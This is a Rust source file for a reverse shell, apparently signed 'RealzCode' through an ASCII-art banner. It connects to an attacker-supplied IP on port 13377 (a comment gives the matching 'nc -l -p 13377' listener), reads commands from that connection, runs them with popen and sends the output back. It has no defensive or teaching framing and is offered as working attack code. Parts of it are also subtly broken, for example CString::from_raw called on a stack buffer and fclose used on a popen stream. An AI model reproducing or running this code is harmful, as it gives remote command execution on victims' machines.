use std::io::{Read, Write};
use std::net::TcpStream;
use std::ptr;
use std::ffi::CString;
use std::os::raw::c_char;
use libc::{c_int, c_void, c_long, FILE, popen, pclose, fread, fwrite, fclose, ferror, strerror_r};

extern "C" {
    fn fileno(stream: *mut FILE) -> c_int;
}

fn main() -> std::io::Result<()> {
    let we = "  _____            _      _____          _      \n\
             |  __ \\          | |    / ____|        | |     \n\
             | |__) |___  __ _| |___| |     ___   __| | ___ \n\
             |  _  // _ \\/ _` | |_  / |    / _ \\ / _` |/ _ \\ \n\
             | | \\ \\  __/ (_| | |/ /| |___| (_) | (_| |  __/ \n\
             |_|  \\_\\___|\\__,_|_/___|\\_____\\___/ \\__,_|\\___| \n";

    let po = 13377; // nc -l -p 13377

    let args: Vec<String> = std::env::args().collect();
    if args.len() < 2 {
        eprintln!("Please provide the IP address as a command-line argument.");
        std::process::exit(1);
    }

    let ip = &args[1];

    let mut stream = TcpStream::connect(format!("{}:{}", ip, po))?;
    stream.write_all(we.as_bytes())?;

    let mut buffer = [0u8; 1024];
    let mut fp: *mut FILE = ptr::null_mut();
    loop {
        stream.write_all(b"\n$ ")?;
        stream.flush()?;

        let bytes_read = stream.read(&mut buffer)?;
        let command = String::from_utf8_lossy(&buffer[..bytes_read]);

        if command.trim() == "exit" {
            break;
        }

        let c_command = CString::new(command.trim()).unwrap();
        fp = unsafe { popen(c_command.as_ptr(), "r\0".as_ptr() as *const c_char) };
        if fp.is_null() {
            eprintln!("Failed to execute command");
            std::process::exit(1);
        }

        let fileno = unsafe { fileno(fp) };
        let mut output = [0u8; 1024];
        let mut total_bytes_read = 0;

        while total_bytes_read < output.len() {
            let bytes_read = unsafe { fread(output.as_mut_ptr().add(total_bytes_read), 1, output.len() - total_bytes_read, fp) };
            if bytes_read <= 0 {
                break;
            }
            total_bytes_read += bytes_read;
        }

        let output_str = String::from_utf8_lossy(&output[..total_bytes_read]);
        stream.write_all(output_str.as_bytes())?;
        stream.flush()?;

        let err = unsafe { ferror(fp) };
        if err != 0 {
            let mut err_buffer = [0u8; 1024];
            unsafe {
                strerror_r(err, err_buffer.as_mut_ptr() as *mut c_char, err_buffer.len() as c_long);
                let err_str = CString::from_raw(err_buffer.as_mut_ptr() as *mut c_char);
                eprintln!("Error: {}", err_str.to_string_lossy());
            }
        }

        unsafe { fclose(fp) };
    }

    Ok(())
}
